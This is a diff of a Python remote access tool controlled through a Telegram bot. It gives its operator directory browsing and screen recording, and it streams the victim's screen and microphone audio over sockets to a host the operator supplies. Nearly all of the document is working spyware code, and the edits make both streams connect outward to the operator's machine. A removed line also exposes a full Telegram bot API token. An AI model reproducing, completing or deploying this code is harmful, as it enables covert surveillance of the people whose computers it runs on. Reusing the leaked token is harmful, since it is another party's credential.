@@ -18,7 +18,6 @@ from ctypes  import windll
 from PIL import Image
 
 
-
 """ Fn """
 def checkID(ms):
     if ms.from_user.id == ADMIN_ID:
@@ -44,7 +43,6 @@ def create_markup():
     return markup
 
 
-
 """ Functional """
 class Client:
     def __init__(self):
@@ -63,9 +61,8 @@ class Client:
 
     def check_command(self, ms):
         if ms.text == "cd":
-            output = os.getcwd()
-            bot.send_message(ADMIN_ID, output, reply_markup=markup)
-        
+            bot.send_message(ADMIN_ID, os.getcwd(), reply_markup=markup)
+
         elif ms.text == "chdir":
             markup_chdir = create_markup()
             markup_chdir.add("..")
@@ -76,8 +73,7 @@ class Client:
                 if ms.text != "EXIT":
                     try:
                         os.chdir(ms.text)
-                        output = os.getcwd()
-                        bot.send_message(ADMIN_ID, output, reply_markup=markup)
+                        bot.send_message(ADMIN_ID, os.getcwd(), reply_markup=markup)
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
                 else:
@@ -87,9 +83,7 @@ class Client:
 
         elif ms.text == "dir":
             try:
-                output = os.listdir(os.getcwd())
-                output = '\n'.join(output)
-                
+                output = "\n".join(os.listdir())
                 if output:
                     bot.send_message(ADMIN_ID, output, reply_markup=markup)
                 else:
@@ -216,12 +210,11 @@ class Client:
 
             while True:
                 break_time = round(time.time()) + 70
-
+                video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
+                
                 while os.path.exists(self.filename_video):
                     index = self.filename_video[5:-4]
                     self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"
-
-                video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
 
                 while True:
                     if round(time.time()) == break_time:
@@ -256,27 +249,28 @@ class Client:
         elif ms.text == "get_screen":
             markup_get_screen = ReplyKeyboardMarkup()
             markup_get_screen.add("EXIT")
-            bot.send_message(ADMIN_ID, "Enter port, ip...", reply_markup=markup_get_screen)
+            bot.send_message(ADMIN_ID, "Enter port, host...", reply_markup=markup_get_screen)
             
             @bot.message_handler(content_types=["text"])
             def getscreen_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        self.running_micro = True
-                        thr = Thread(target=self.get_micro).start()
-                        
                         list_data = ms.text.split()
                         PORT = int(list_data[0])
-                        IP = list_data[1]
+                        HOST = list_data[1]
+                        
+                        self.running_micro = True
+                        thr = Thread(target=self.get_micro, args=(HOST,)).start()
 
                         server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         __running = True
                         
                         try:
                             bot.send_message(ADMIN_ID, "Connection attempt 🎲")
-                            server_socket_s.connect((IP, PORT))
+                            server_socket_s.connect((HOST, PORT))
                         except Exception as e:
-                            bot.send_message(ADMIN_ID, "Сonnection error ❌", reply_markup=markup)
+                            bot.send_message(ADMIN_ID, f"Error ❌\n{e}", reply_markup=markup)
+                            return
 
                         bot.send_message(ADMIN_ID, "Successful connection ✅", reply_markup=markup)
                         while __running:
@@ -289,11 +283,7 @@ class Client:
                             
                             try:
                                 server_socket_s.sendall(struct.pack(">L", len(data)) + data)
-                            except ConnectionResetError:
-                                __running = False
-                            except ConnectionAbortedError:
-                                __running = False
-                            except BrokenPipeError:
+                            except:
                                 __running = False
 
                     except Exception as e:
@@ -331,9 +321,8 @@ class Client:
         wf.writeframes(b"".join(frames))
         wf.close()
 
-    def get_micro(self):
-        port = 9999
-        chunk = 8192
+    def get_micro(self, HOST):
+        PORT = 9999
 
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
@@ -343,14 +332,16 @@ class Client:
                         output=True,
                         frames_per_buffer=self.CHUNK)
 
-        server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket_m.bind(('', port))
-        server_socket_m.listen(5)
-        conn, addr = server_socket_m.accept()
+        try:
+            server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket_m.connect((HOST, PORT))
+        except Exception as e:
+            bot.send_message(ADMIN_ID, f"Error ❌\n{e}", reply_markup=markup)
+            return
 
         while self.running_micro:
             try:
-                conn.sendall(stream.read(chunk))
+                server_socket_m.sendall(stream.read(self.CHUNK))
             except IOError:
                 self.running_micro = False
             except:
@@ -359,14 +350,13 @@ class Client:
         stream.stop_stream()
         stream.close()
         server_socket_m.close()
-        conn.close()
+        server_socket_m.close()
         p.terminate()
 
 
-
 """ Variables """
-API_TOKEN = "6669917733:AAE77ceLu3WIEcwORpqBFQiS3X7Ol-BSCmo"
-ADMIN_ID = 804011643
+API_TOKEN = "token"
+ADMIN_ID = id
 bot = TeleBot(API_TOKEN)
 
 markup = ReplyKeyboardMarkup(True, True)
@@ -378,7 +368,6 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("get_screen"))
 
 
-
 """ Start """
 client = Client()
 bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
@@ -387,7 +376,6 @@ bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
 def send_welcome(ms):
     if checkID(ms):
         bot.send_message(ADMIN_ID, text="/_start", reply_markup=markup)
-
 
 @bot.message_handler(content_types=["text"])
 def CheckCommand(ms):
